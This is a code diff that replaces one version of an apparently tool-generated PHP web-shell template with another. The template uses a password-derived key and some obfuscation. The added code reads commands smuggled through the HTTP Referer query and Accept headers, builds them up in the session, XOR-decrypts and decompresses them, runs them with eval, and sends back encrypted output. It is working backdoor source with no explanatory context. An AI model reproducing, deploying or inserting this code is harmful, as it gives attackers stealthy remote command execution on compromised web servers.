@@ -1,5 +1,68 @@
-<%! import hashlib %><% 
-key = hashlib.md5(password).hexdigest(); 
-trigger = key[:3]
-terminator = key[3:6] 
-%>$k="${trigger}";$e="${terminator}";<%text>function x($t,$k){$c=strlen($k);$l=strlen($t);$o="";for($i=0;$i<$l;){for($j=0;($j<$c&&$i<$l);$j++,$i++){$o.=$t{$i}^$k{$j};}}return $o;}$u=parse_url($_SERVER["HTTP_REFERER"]);$q=null;if(isset($u["query"]))parse_str($u["query"],$q);if($q){$r=x($_SERVER["HTTP_USER_AGENT"],$k);foreach($q as $p){$K=strpos($p,$k);$E=strpos($p,$e);if(($E!==false)||($K!==false)){@session_start();$s=&$_SESSION["s"];$s.=preg_replace(array("#$e.*#","#$k#","#_#"),array("","","+"),$p);if($E!==false){ob_start();eval(gzuncompress(x(base64_decode($s),$r)));$o=ob_get_contents();ob_end_clean();$d=base64_encode(x(gzcompress($o),$r));print("<$k$e>$d</$k$e>");@session_destroy();}}}}</%text>
+<%! import hashlib %><%
+key = hashlib.md5(password).hexdigest().lower()
+header = key[:4]
+footer = key[4:8]
+%>$kh="${header}"; 
+$kf="${footer}";
+<%text>
+function x($t,$k) {
+	$c=strlen($k);
+	$l=strlen($t);
+	$o="";
+	for($i=0;$i<$l;) {
+		for($j=0;($j<$c&&$i<$l);$j++,$i++)
+		{
+			$o.= $t{$i}^$k{$j};
+		}
+	}
+	return $o;
+}
+
+$r=$_SERVER;
+$rr=@$r["HTTP_REFERER"];
+$ra=@$r["HTTP_ACCEPT"];
+
+if($rr&&$ra){
+
+parse_str(@parse_url($rr)["query"],$q);
+	$q=array_values($q);
+	preg_match_all('/([\w])[\w-]+(?:;q=0.([\d]))?,?/',$ra,$m);
+
+	if($q&&$m) {
+		@session_start();
+
+		$s=&$_SESSION;
+		$ss='substr';
+		$sl='strtolower';
+		
+		$i=$m[1][0].$m[1][1];
+		$h=$sl($ss(md5($i.$kh),0,3));
+		$f=$sl($ss(md5($i.$kf),0,3));
+
+		$p='';
+		for($z=1;$z<count($m[1]);$z++) $p.=$q[$m[2][$z]];
+
+		if(strpos($p,$h)===0){
+			$s[$i] = '';
+			$p=$ss($p,3);
+		}
+
+		if(array_key_exists($i,$s)) {
+
+			$s[$i].=$p;
+
+			$e=strpos($s[$i],$f);
+			if($e){
+				$k=$kh.$kf;
+				ob_start();
+				eval(gzuncompress(x(base64_decode(preg_replace(array("/_/","/-/"),array("/","+"),$ss($s[$i],0,$e))),$k)));
+				$o=ob_get_contents();
+				ob_end_clean();
+				$d=base64_encode(x(gzcompress($o),$k));
+				print("<$k>$d</$k>");
+				@session_destroy();
+			}
+		}
+	}
+}
+</%text>
